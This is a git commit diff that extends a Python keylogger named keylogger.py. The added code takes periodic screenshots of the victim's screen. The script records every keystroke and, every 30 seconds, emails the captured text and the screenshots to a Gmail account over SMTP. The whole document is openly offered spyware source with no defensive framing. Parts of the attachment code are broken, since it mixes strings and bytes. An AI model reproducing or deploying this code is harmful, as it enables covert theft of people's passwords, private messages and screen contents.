722271505ca8783d415206056a10be89dcafd777
Faruk <98034193+farukerdem34@users.noreply.github.com>
2023-08-03 19:33:22 +0300

    Enhanced Keylogger with Periodic Screenshots

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,18 @@
 from pynput import keyboard
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyListener
 from smtplib import SMTP
 from threading import Timer
+from PIL import ImageGrab
+import io
 
 log = ""
-
+screenshot_count = 0
+screenshot_paths = []
 
 def callback_function(key):
-    global log
+    global log, screenshot_count
+
     try:
         log = log + str(key.char)
     except AttributeError:
@@ -19,19 +25,46 @@ def callback_function(key):
 
     print(log)
 
-def send_email(email,password,message):
-    email_server = SMTP("smtp.gmail.com",587)
+    # Take a screenshot every 60 keystrokes (adjust as needed)
+    screenshot_count += 1
+    if screenshot_count == 60:
+        take_screenshot()
+        screenshot_count = 0
+
+def take_screenshot():
+    global screenshot_paths
+
+    # Capture the screenshot
+    screenshot = ImageGrab.grab()
+
+    # Save the screenshot to a file
+    screenshot_path = f"screenshot_{len(screenshot_paths)}.png"
+    screenshot.save(screenshot_path)
+    screenshot_paths.append(screenshot_path)
+
+def send_email(email, password, message, attachments=None):
+    email_server = SMTP("smtp.gmail.com", 587)
     email_server.starttls()
-    email_server.login(email,password)
-    email_server.sendmail(email,email,message)
+    email_server.login(email, password)
+
+    email_message = f"Subject: Keylogger Data\n\n{message}"
+    
+    if attachments:
+        for attachment in attachments:
+            with open(attachment, "rb") as file:
+                email_server.sendmail(email, email, email_message + file.read())
+
+    else:
+        email_server.sendmail(email, email, email_message)
+
     email_server.quit()
 
-
 def thread_function():
-    global log
-    send_email("user@gmail.com", "password", log.encode('utf-8'))
+    global log, screenshot_paths
+    send_email("user@gmail.com", "password", log.encode('utf-8'), screenshot_paths)
     log = ""
-    timer_object = Timer(30,thread_function)
+    screenshot_paths = []
+    timer_object = Timer(30, thread_function)
     timer_object.start()
 
 keylogger_listener = keyboard.Listener(on_press=callback_function)
